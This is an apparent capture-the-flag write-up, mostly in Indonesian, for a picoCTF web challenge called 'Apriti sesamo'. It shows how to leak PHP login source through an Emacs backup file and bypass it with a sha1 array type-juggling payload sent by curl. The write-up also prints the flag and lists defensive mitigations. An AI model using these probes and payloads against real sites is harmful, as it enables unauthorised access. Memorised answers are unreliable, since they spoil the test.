# 467 - Apriti sesamo (Web Exploitation, picoCTF 2025, Medium)

## Challenge Metadata
- ID: 467 | Event: picoCTF 2025
- Category: Web Exploitation | Difficulty: Medium (2)
- Author: Junias Bonou
- Points: 300 Pts
- Flag: `academy{w3Ll_d3sErV3d_Ch4mp_3ccde0d1}`

## Problem Statement & Scope
Aplikasi web menyediakan antarmuka login yang diklaim "mustahil diretas" (*impossible to hack*).
Deskripsi menyatakan:
*"I found a web app that claims to be impossible to hack! Try it here!"* dengan petunjuk pengujian:
- Hint 1: `Backup files`
- Hint 2: `Rumor has it, the lead developer is a militant emacs user`

Objektif pengujian (NIST SP 800-115 / OWASP WSTG-INFO-05 Review Webserver Metafiles & OWASP WSTG-INPV-12 Testing for Type Confusion / PHP Type Juggling):
Mengidentifikasi kebocoran berkas cadangan (*editor backup file leakage*), merekonstruksi logika validasi otentikasi PHP, mengeksploitasi anomali *type juggling* fungsi hash `sha1()` saat menerima parameter bertipe array, dan mengekstrak token flag dari berkas `../flag.txt`.

## Teori & Analisis Arsitektur Kerentanan
1. **Source Code Disclosure via Editor Backup Files (CWE-530):**
   Text editor populer (seperti GNU Emacs) secara default membuat salinan cadangan otomatis dengan menambahkan akhiran tilde (`~`) pada nama berkas yang diedit (misalnya `filename.php~`).
   Karena server web Apache umumnya hanya memetakan handler interpreter PHP pada berkas berekstensi `.php` murni, berkas berekstensi `.php~` disajikan langsung sebagai plain text (`Content-Type: text/plain` atau `application/octet-stream`). Hal ini mengakibatkan pengungkapan kode sumber backend (*backend source code disclosure*).
2. **Analisis Logika Otentikasi Tersembunyi:**
   Pengunduhan `GET /impossibleLogin.php~` memperlihatkan logika PHP backend yang diobfuskasi:
   ```php
   if (isset($_POST['username']) && isset($_POST['pwd'])) {
       $yuf85e0677 = $_POST['username'];
       $rs35c246d5 = $_POST['pwd'];
       if ($yuf85e0677 == $rs35c246d5) {
           echo "<br/>Failed! No flag for you";
       } else {
           if (sha1($yuf85e0677) === sha1($rs35c246d5)) {
               echo file_get_contents('../flag.txt');
           } else {
               echo "<br/>Failed! No flag for you";
           }
       }
   }
   ```
3. **Flaw Analisis: PHP Type Juggling & Array Handling:**
   - Kondisi pertama: `$username != $pwd` (nilai username dan password tidak boleh sama).
   - Kondisi kedua: `sha1($username) === sha1($pwd)` (nilai hash sha1 dari keduanya harus identik secara ketat).
   - Fungsi bawaan PHP `sha1()` dirancang untuk memproses string. Jika tipe data yang diteruskan berupa array (misalnya diinputkan via form dengan sintaks HTTP array `username[]=a&pwd[]=b`):
     - Operator kesetaraan longgar `['a'] == ['b']` bernilai `False`.
     - `sha1(['a'])` memicu *PHP Warning: sha1() expects parameter 1 to be string, array given* dan mengembalikan nilai primitif `NULL`.
     - `sha1(['b'])` juga memicu warning dan mengembalikan `NULL`.
     - Perbandingan tipe ketat `NULL === NULL` bernilai `True`.
   - Alur eksekusi berhasil masuk ke blok sukses dan mengeksekusi `file_get_contents('../flag.txt')`.

## Rekonstruksi Eksploitasi Step-by-Step
1. Tahap 1 — Probing Status & Inisiasi Kontainer Lab:
   - Mengaktifkan kontainer challenge melalui endpoint CyLab: `PUT /api/challenges/467/instance/`.
   - Mendapatkan alamat layanan target: `http://chatelaine.cylabacademy.net:48461/`.
2. Tahap 2 — Penemuan Berkas Cadangan Emacs:
   - Mengakses endpoint berkas cadangan:
     ```bash
     curl -s -i http://chatelaine.cylabacademy.net:48461/impossibleLogin.php~
     ```
   - Berkas cadangan berhasil diunduh secara penuh dan membocorkan kode PHP asli.
3. Tahap 3 — Deobfuskasi & Eksekusi Array Juggling Exploit:
   - Mengirim permintaan HTTP POST dengan parameter bertipe array yang memiliki elemen berbeda:
     ```bash
     curl -s -d "username[]=a&pwd[]=b" http://chatelaine.cylabacademy.net:48461/impossibleLogin.php
     ```
   - Server menampilkan warning PHP dan mengeluarkan isi flag:
     ```text
     Warning: sha1() expects parameter 1 to be string, array given in /var/www/html/impossibleLogin.php on line 38
     Warning: sha1() expects parameter 1 to be string, array given in /var/www/html/impossibleLogin.php on line 38
     academy{w3Ll_d3sErV3d_Ch4mp_3ccde0d1}
     ```
4. Tahap 4 — Validasi Flag & Pembersihan Sesi:
   - Mengirim token flag ke REST API CyLab: `POST /api/submissions/` dengan payload:
     `{"challenge": 467, "flag": "academy{w3Ll_d3sErV3d_Ch4mp_3ccde0d1}"}`.
   - Respons platform: `HTTP 201 Created` (`correct: true`, user 1072359).
   - Mengirim permintaan `DELETE /api/challenges/467/instance/` untuk membersihkan kontainer lab secara bersih.

## Flag & Bukti Verifikasi
- Flag Resmi: `academy{w3Ll_d3sErV3d_Ch4mp_3ccde0d1}`
- Bukti Validasi: REST API CyLab `POST /api/submissions/` merespons dengan status HTTP 201 Created (`correct: true`, user 1072359).

## Takeaway Kompetensi LKS & Mitigasi Defensif
- **Pembersihan Berkas Cadangan Editor:** Jangan pernah menyimpan atau membiarkan berkas cadangan otomatis editor (`*~`, `*.bak`, `*.swp`, `.#*`) tertinggal pada direktori root web publik (`webroot`). Konfigurasikan `.gitignore` dan pipeline deployment CI/CD untuk mengecualikan berkas artefak editor.
- **Web Server Hardening (.htaccess / Nginx / Apache Rules):** Blokir akses HTTP ke berkas cadangan secara global pada konfigurasi web server:
  ```apache
  <FilesMatch ".*~$|\.bak$|\.swp$">
      Require all denied
  </FilesMatch>
  ```
- **Strict Parameter Type Validation:** Selalu validasi tipe data input sebelum diteruskan ke fungsi kriptografi atau logika autentikasi:
  ```php
  if (!is_string($_POST['username']) || !is_string($_POST['pwd'])) {
      die("Invalid input type");
  }
  ```
- **Gunakan Algoritma Password Hashing Modern:** Jangan gunakan fungsi hash cepat/usang seperti `sha1()` atau `md5()` untuk otentikasi. Wajibkan penggunaan `password_hash()` dan `password_verify()` dengan algoritma Argon2id atau Bcrypt.
